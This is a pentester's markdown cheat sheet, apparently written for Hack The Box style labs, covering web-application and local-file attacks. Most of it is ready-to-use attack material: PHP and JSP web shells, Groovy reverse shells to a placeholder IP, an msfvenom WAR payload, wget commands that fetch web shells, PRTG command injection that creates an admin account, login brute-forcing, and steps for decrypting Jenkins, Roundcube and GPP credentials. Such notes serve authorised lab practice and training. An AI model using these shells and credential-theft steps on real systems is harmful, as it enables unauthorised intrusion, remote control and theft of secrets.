# Web Application

## Amazon Buckets

The are different types of subdomains, for example `s3.` are amazon buckets subdomains on the cloud. Always add the subdomains to the `/ets/hosts/` file next to the domain..

Use `awscli` to interact with them. 

To list the buckets:
`aws --endpoint=http://s3.thetoppers.htb s3 ls`

To list the objects inside the buckets just specify the bucket at the end of the previous command:

```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

If php files are shown, it means that the bucket is handling the php page. Thus creating an appropriate php file and coping it in the bucket, will open a shell:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

## APIs

##### **Web Services (SOAP/XML)**

##### REST APIs

API with multiple endpoints

##### GraphQL

By **default** graphQL does **not** implement authentication, has a **single endpoint**.

- **Endpoint discovery:**
	```bash
	python3 ~/TOOLS/graphw00f/main.py -d -f -t [URL]
	```

  - Send an universal query (with param `'{"query":"query { __typename }"}'` to:

  	- */graphql*

  	- */graphiql*

  	- */graphql.php*

  	- */graphql/console*

  	- appending `/v1` to the path

  - Usually they only accept POST requests that have a content-type of `application/json`, but also GET or `x-www-form-urlencoded` can work.

- **Introspection query**

	```bash
	curl [URL] -X POST -H "Content-Type: application/json" -d '{"query": "query { __schema { queryType { fields { name } } mutationType { fields { name } } } }"}' | jq
	```

	- Look for queries, mutations, and everything that doesn't start with `__`

## CGI, CGI-BIN

The dir can be hidden, remember to FUZZ!!

Directory containing scripts: `/cgi`, `/cgi-bin`, `/CGI-bin`

- Extension Fuzzing → `pl`, `cgi`, `sh`, `bat`, `cmd`
- Apache Tomcat: `[URL]/[CGI_DIR]/[SCRIPT]&[URL_enc-CMD]` (CVE-2019-0232)
  - dir
  - set (env variables)
  - whoami
- [Shellshock Exploits](https://github.com/mubix/shellshocker-pocs)

## ColdFusion

##### Enumeration

- Port 80 for HTTP and port 443 for HTTPS by default
- File extensions: `.cfm` `.cfc`
- Installation files: `admin.cfm` and `CFIDE/administrator/index.cfm`

##### Exploit

- Adobe ColdFusion <= 9.0.1 **Directory traversal** CVE-2010-2861
  - `lib/password.properties` stores encypted passwords (could also not be in `lib`)
- Adobe ColdFusion versions <=8.0.1 **RCE** CVE-2009-2265
## CouchDB
https://gitee.com/scriptkiddies/hacktricks/blob/master/pentesting/5984-pentesting-couchdb.md?skip_mobile=true#document-list
## DNN
https://angelica.gitbook.io/hacktricks/network-services-pentesting/pentesting-web/dotnetnuke-dnn
## Drupal

##### Enumeration

```bash
curl -s [URL] | grep -i drupal
curl -s [URL]/CHANGELOG.txt | grep -m2 ""
droopescan scan drupal -u [URL]
```

##### Exploitation

- **Version < 8**: Enable PHP Filter module

  1. Login    → `/admin/modules` → Enable `PHP Filter`
  2. Content → Add Content    → Create `Basic Page`    → PHP Shell in Body → Text Format = `PHP Code`
  3. Save     → Append Shell Parameters to Page URL → `/node/[ID]?p=[CMD]`

- **Version > 8**: Install the PHP filter module

  1. Download 

     ```bash
     wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
     ```

  2. Go to Administration &rarr; Reports &rarr; Available updates (or in the Extend menu)

  3. Install &rarr; Previous exploit

- **Upload a new Module** (administrative access)

  1. Select a module and download it, e.g. CAPTCHA

     ```bash
     wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz; tar xvf captcha-8.x-1.2.tar.gz
     ```

  2. Create PHP Shell File

  3. Create a `.htaccess` File

     ```html
     <IfModule mod_rewrite.c>
     RewriteEngine On
     RewriteBase /
     </IfModule>
     ```

  4. Create  an archive

     ```bash
     mv shell.php .htaccess captcha
     tar cvf captcha.tar.gz captcha/
     ```

  5. Upload:

     - click on Manage &rarr; Extend &rarr; Install new module`

     - Request: `/modules/captcha/shell.php?p=[CMD]`

- **Drupalgeddon**

  - [Drupalgeddon](https://www.drupal.org/SA-CORE-2014-005) 7.0 - 7.31 pre-authenticated SQL injection
  - [Drupalgeddon2](https://www.drupal.org/sa-core-2018-002)<7.58, 8.5.1 RCE
  - [Drupalgeddon3](https://cvedetails.com/cve/CVE-2018-7602/) 7.x, 8.x RCE
## Git

### Web
`/.git`

  ```bash
  mkdir github; git-dumper [URL] ./github
  ```
### Privesc
- `git log --oneline` -> get commits
- `git diff [CURR_COMMIT] [COMMITS]`
- `git checkout [COMMIT]` -> browse the correspondent folder
## Gitlab

##### Enumeration

- Version: `/help` when logged in
- Public projects: `/explore`
- Users: `/users/sign_up`

## IIS

##### Enumeration

- General discovery: 

  `/usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt`

- Shortname scanner (`msfconsole or` https://github.com/irsdl/IIS-ShortName-Scanner)

  It returns file/dir name with the wildcards `*` and `*~1`, that have to be fuzzed

- Extensions:

  `/usr/share/wordlists/extension-wordlist/asp.net.txt`

## Jenkins

### Enumeration

- Configuration → `[URL]/configureSecurity`
- Login Page    → `[URL]/login` → Jenkins Banner / Spraying

### RCE

1. Access the script console `[URL]/script`, to run Apache Groovy scripts

2. Groovy Linux

   - Groovy code to get rev shell

     ```groovy
     r = Runtime.getRuntime()
     p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/[IP]/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
     p.waitFor()
     ```

   - [Metasploit](https://web.archive.org/web/20230326230234/https://www.rapid7.com/db/modules/exploit/multi/http/jenkins_script_console/)

3. Groovy Windows

   - Groovy code 

      ```groovy
       String host="[TUNIP]";
       int port=8044;
       String cmd="cmd.exe";
       Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
       ```

   - [Java Shell](https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy)

   - Replace `host`, `port` strings
### Important Files
- Hashes
	- `/secrets/initialAdminPassword'`
	- `/users/admin/config.xml`
	- `/users/users.xml` -> Get ID
	- `/users/[USER_ID]/config.xml'`
- stored encrypted credentials
	- `/credentials.xml` 
	- `/config.xml`
- Decryption Files:
	- `/secrets/master.key` 
	- `/secrets/hudson.util.Secret` 
- Decryption tool:
  ```bash
  ~/TOOLS/jenkins-credentials-decryptor -m master.key -s hudson.util.Secret -c [CRED_FILE] -o json
  ```

## Jetty
Java web server made to host other Java Servlets
## Joomla

##### Enumeration

- Version fingerprinting

  - `media/system/js/`
  - `administrator/manifests/files/joomla.xml`
  - `plugins/system/cache/cache.xml`

- Enumeration

  - `droopescan scan joomla --url [URL]`
  - `python2.7 ~/TOOLS/JoomlaScan/joomlascan.py -u [URL]`

- Brute-Forcing [joomla-brute](https://github.com/ajnik/joomla-bruteforce)

	```bash
	sudo python3 joomla-brute.py -u [URL] -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
	```
## Laravel
### Enumeration
`larascan --url [URL] --threads=5`

## Magento

### Exploit
- SQL [CVE-2019-7139](https://nvd.nist.gov/vuln/detail/CVE-2019-7139) -> admin credentials -> check `app/etc/local.xml` path
	• Magento Open Source <= 1.9.4.0
	• Magento Commerce <= 1.14.4.0
	• Magento 2.1 <= 2.1.16
	• Magento 2.2 <= 2.2.7
	• Magento 2.3.0
### Admin Exploit

1. Catalog Menu -> Manage Products
2. Create one or select an existing one
3. Add New Option -> select “File” in Input Type field and add “.php” to Allowed File Extensions
4. Click on the item -> add to cart
### Important files
- `/app/etc/local.xml`

## Mattermost

### Important files 
- `/opt/mattermost/config/config.json`
## OpenNetAdmin
### Interesting Files
- `[ONA_PATH]/config` -> config files
- `[ONA_PATH]/local/config` -> config files
## osTicket
### Enumeration
- cookie named `OSTSESSID`
- The footer may contain the words `Support Ticket System`.
- Version
	```bash
	python3 /home/damuna/TOOLS/pentesting-osTicket/ostVersionScanner.py [URL]
	``` 
- Guest account -> create an email by submitting a ticket -> allows email verification -> authentication to other web services
### Exploit

- RCE (after logging in /administrator)
  1. If `An error has occurred. Call to a member function  format() on null` go to  `/administrator/index.php?option=com_plugins` and disable the "Quick Icon - PHP Version Check" plugin. 
  2. click on `Templates` on the bottom left under `Configuration` 
  3. click on a template &rarr; choose `protostar` under the `Template` column
  4. click on a page to pull up the page source
  5. Add a php web shell `system($_GET['c']);`
### Interesting Files

- `/var/www/osticket/upload/include/ost-config.php`

## PGAdmin

[pgadmin](https://www.pgadmin.org) is an administration and development platform for PostgreSQL. You can find **passwords** inside the _**pgadmin4.db**_ file 
-> Decrypt: `{bash} ~/tools/pga4decrypt/pga4decrypt pgadmin.db`

## PRTG Monitor

##### Admin Shell

- Click on Setup &rarr; Account Settings &rarr; Notifications &rarr; Add new notification

- Set Name → Tick `EXECUTE PROGRAM` 

- Under `Program File` select `Demo exe notification  - outfile.ps1`

- Enter a command in the Parameter CMD field, `test.txt;[CMD]`e.g. add a new local admin:

  ```powershell
  test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
  ```

- Save → Click `Test` to Run Notification

## PWM
```ad-info
an open source password self-service application for LDAP directories
```
- click on top tight arrow to get version
## Sandboxes
### JavaScript

### Python

https://hacktricks.boitatech.com.br/misc/basic-python/bypass-python-sandboxes

## Roundcube
### Enumeration
- `/CHANGELOG`
### Exploit
1. Check `/var/www/html/roundcube/config/config.inc.php` to see where sessions are stored and get the session encryption key `$config['des_key'] = 'rcmail-!24ByteDESkey*Str';`
2. Sessions could be in `/var/lib/roundcube/sessions/` or in a database
3. Decode from base64
4. Decrypt using the encryption key
	```php
	<?php
	$encrypted = "[PWD]";
	$key = "[KEY]"; // From config.inc.php
	
	// Decode Base64 and decrypt
	$decoded = base64_decode($encrypted);
	$iv = substr($decoded, 0, 8); // First 8 bytes = IV
	$ciphertext = substr($decoded, 8);
	$decrypted = openssl_decrypt(
	    $ciphertext,
	    'des-ede3-cbc',
	    $key,
	    OPENSSL_RAW_DATA,
	    $iv
	);
	
	echo "Decrypted password: " . $decrypted . "\n";
	?>
	```
## Ruby on Rails

Vulnerable to mass assignment exploit: 

Endpoints with PATCH/PUT Capabilities → [Assignment Parameters](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/README.md#exploiting-a-mass-assignment)

## Splunk

##### Shell Upload

1. Endpoint: `[URL]/manager/search/apps/local`   → Install app from File

2. Download [Create Shell Package](https://github.com/0xjpuff/reverse_shell_splunk)

3. Edit `/bin/rev.py` for Linux or `/bin/run.ps1` for Windows

4. Tar up

   ```bash
   tar -cvzf updater.tar.gz reverse_shell_splunk/
   ```

5. Start a listener

6. `Install app from file` and upload

## Torrent Hoster

### Exploit
- Upload a sample torrent file
- Change its image in a web shell

## Tomcat

### Enumeration

```bash
curl -s [URL]/docs | grep -i tomcat
```

Files to check:

- `/WEB-INF/web.xml`
- `/conf/tomcat-users.xml` -> contains credentials
- `/cgi` folder

Fingerprinting:

Invalid Path → `[URL]/Invalid` → Error String Version Disclosure → Exploit Research

### Unauthenticated Exploit
- **Login Bruteforcing** (common default credentials)
  - Metasploit:
    `use auxiliary/scanner/http/tomcat_mgr_login` / `mgr_brute.py` 
  - [mgr_brute.py](https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce)
- **GhostCat** Unauthenticated LFI
  - [tomcat-ajp.lfi.py](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi)
		```bash
		python2 tomcat-ajp.lfi.py [URL] -p [PORT] -f conf/tomcat-users.xml
		```
  - Versions < `9.0.31`, `8.5.51`, `7.0.100`
- **401/403 Bypass**
	- **Breaking Parser Logic** -> proxy attacks
	- `http://10.10.11.138/damuna/..;/manager/` -> Apache sees that as three directories deep, but Tomcat will process `/..;/` as the parent directory

### Authenticated Exploit

- **Shell Upload**
	- if only manager-script is available, the upload is only possible via `/manager/text` -> [guide](https://medium.com/@cyb0rgs/exploiting-apache-tomcat-manager-script-role-974e4307cd00)
  - Metasploit automated:
     [multi/http/tomcat_mgr_upload](https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/) 
  - WAR shell:
    - Download from `jsp`
      ```bash
      wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp; zip -r backup.war cmd.jsp
      ```
    - Very Light `jsp` shell and stealty
      ```bash
      wget https://raw.githubusercontent.com/SecurityRiskAdvisors/cmd.jsp/refs/heads/master/cmd.jsp; zip -r backup.war cmd.jsp
      ```
      Change Uploaded Casing → `FileOutputStream(f);stream.write(m);o="uPlOaDeD:`
    - Metasploit:
      ```bash
      msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war > backup.war
      ```

  - Browse & Upload → Deploy → Request `[URL]/backup/cmd.jsp?p=[CMD]`
- **Applications exploits**
	- `Log4Shell` in `idle` application parameter 
### File Hunting
- look for `tomcat-users.xml`
- `/usr/share/tomcat9/etc/tomcat-users.xml`
- `/etc/tomcat9/tomcat-users.xml`
- `/usr/local/tomcat/conf/tomcat-users.xml`
## Umbraco

### Credential Hunting

##### Where to Find the Database

- **`web.config`** or **`appsettings.json`** (in newer versions) contains the database connection string.
- Look for a connection string named **`umbracoDbDSN`** or similar.
    
##### Backup Files

- If you have a **`/data/`** or **`/App_Data/`** folder, check for:
    - **`Umbraco.sdf`** (SQL CE database, older versions)
	    - `strings Umbraco.sdf | head`
    - **`.mdf` or `.ldf`** (SQL Server files)
    - **`umbraco.config`** (but credentials are not stored here)

## Webmin

RCE Package Updates
- Metasploit
- Before: go in Scheduled Upgrades -> Install any updates

## Wordpress

### Standard folders

- wp-admin
- wp-login.php
  - Confirm valid users
- wp-content
  - plugins
    - To get version: go to the `readme.txt`
    - Exploit research:
      - `mail-masta`: [unauthenticated SQL injection](https://www.exploit-db.com/exploits/41438) and [Local File Inclusion](https://www.exploit-db.com/exploits/50226)
  - themes

### Exploit

- **enumeration**
  ```bash
	  wordscan [URL]          # Press Enter
  ```
	- Manual exploit research on themes & plugins
	- Web search of in `wp-scan` website
- **login brute-forcing**

  ```bash
  sudo wpscan --password-attack xmlrpc -t 20 -U [USER] -P /usr/share/wordlists/rockyou.txt --url [URL]
  ```

- **Code-Execution** (administrative access) [Also on Metaspoit]
  1. `Appearance` on the side panel &rarr; `Theme File Editor`. 
  2. Select a theme (better non active)
  3. Edit the php code of an uncommon page (e.g. 404.php) by adding a web shell `system($_GET[0]);`
  4. Click on `Update File` at the bottom to save. 
### Interesting files
- `../wp-config.php`
- SQL Database
	- `SELECT user_login,user_pass FROM wp_users`

# Local Applications
## Passpie
-> `.passpie` folder
1. List stored passwords: `passpie list`
2. Get private key
3. Convert to hash: `gpg2john [private.key] > hash.txt` -> john cracking
4. `passpie copy --to stdout --passphrase [PGP_PASS] [LOGIN]@[NAME]`
## pswm
- `look for ~/.local/share/pwsm`
- Use a decryptor on github
### Enumeration
- check `ENV` vairables
- check for `vault` binary 
- `{bash} vault secrets list` -> enumerate stored secrets
- `{bash} vault list [secret]/`
# Interesting Files
- Check Metadata -> `exiftool [FILE]`
## Archives
- `zip2john backup.zip > auth.hash`
- GZIP
  ```bash
	for i in $(cat ~/WORDLISTS/rockyou.txt);do openssl enc -aes-256-cbc -d -in [GZIP.gzip] -k $i 2>/dev/null| tar xz;done
	```
## Documents
- Microsoft Office .docx ->`office2john.py`
- PDF -> `pdf2john.py`
- `xlsx` 
	- `exiftool file.xlsx`
	- `office2john file.xlsx > hash.txt`
	- Online Reader

## MSI
1. Unzip with https://www.ezyzip.com
2. Cannot be reverse Engineered
3. Look up the package name, to infer some installed apps
## Pictures
- steganography -> hiding a secret message within an ordinary, non-secret file 
  ```bash
  steghide extract -sf [IMAGE] -p [PASSWORD]
  ```
## Password Files
### Ansible Vault
```bash
ansible2john [FULL_HASH_TXT] > hash.txt
hashcat -m 16900 hash.txt ~/WORDLISTS/rockyou.txt --user
# Use the cracked password to read the .yml files
ansible-vault decrypt example.yml --output decrypted.txt
# If it doesnt work
ansible localhost -m debug -a "var=[VARIABLE_NAME_TO_DECRYPT]" -e "@[FILE]" --ask-vault-pass
```
### GNUpg
- Needs File → `keyvault.gpg`
- `cp -r /home/[USER]/.gnupg /tmp/mygnupg`
- `chmod -R 700 /tmp/mygnupg`
- `gpg --homedir /tmp/mygnupg --list-secret-keys`
- `gpg --homedir /tmp/mygnupg --output [OUT_DECRYPTED.txt] --decrypt [KEYVAULT_FILE]`
### GPP Password 
GPP passwords are stored in XML files inside:
**`\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\{GUID}\MACHINE\Preferences\`**
- Common files containing passwords:
	- **`Groups\Groups.xml`** (Local users)
	- **`Services\Services.xml`** (Service accounts)
	- **`ScheduledTasks\ScheduledTasks.xml`** (Task passwords)
	- **`DataSources\DataSources.xml`** (DB credentials)
- **Look for the `cpassword=` field**, which stores the **AES-encrypted** password.
Decrypt with on Kali by `gpp-decrypt "[CPWD]"`
### Keepass
- Brute-Forcing
	- `keepass2john [KBDX_FILE]`   -> hashcat
	- `keepass4brute <kdbx-file> <wordlist>`
- Database Read
	- `kpcli` →  `import <file> <path> [<file.key>]` to open Database 
		- `ls` and `cd` to move
	- GUI: `keepassxc`
- CVEs
	- [KeePass 2.X Master Password Dumper](https://github.com/vdohney/keepass-password-dumper) allows retrieving the master password 
### .keytab .kt
Stores NT hashes on Linux 
- User impersonification (rw)
	- `kinit [USER]@[DOMAIN] -k -t [FILE.keytab]` (use full path)
	- `klist`: Check if impersonification was successful
- Hash Extraction ([KeyTabExtract](https://github.com/sosdave/KeyTabExtract))
	- `~/TOOLS/KeyTabExtract/keytabextract.py [FILE.keytab]`
	- `hashcat -m 1000`
### .psafe3
- `pwsafe file.psafe3`
- Crack the password: `pwsafe2john [psafe] > hash.txt`

## Sniffing (traffic)
- .pcap files
	```bash
	~/TOOLS/PCredz/Pcredz -f [FILE] -t -v
	```
- `.ncapgn` -> `tshark -r [FILE] -Y [SERVICE]`
	- ` -Y "snmp" -V | grep "community"`
## SSH Keys
Acquire the hash for an encrypted SSH key, and then crack it
```shell-session
ssh2john SSH.private > ssh.hash
john --format=ssh ssh.hash --wordlist=~/WORDLISTS/rockyou.txt
```
## VHD / VMDK / VHDX
- Check if it is encrypted with bitlocker: `sudo dislocker-metadata -v [FILE]`
  1. `bitlocker2john -i [VHD_FILE] > hash` → Crack Hash
  2. `bitmount [VHD_FILE] [PWD]`
- If unencrypted:
	- Mounting ([guide](https://www.nakivo.com/blog/extract-content-vmdk-files-step-step-guide/))
	    1. `vhdMount [FILE]`
	    2. SAM & NTDS Dumping in `Windows\system32\config`
	- Windows Mounting:
		- right-click on the file and choose `Mount`
		- powershell: `Mount-VHD -Path [FILE]`


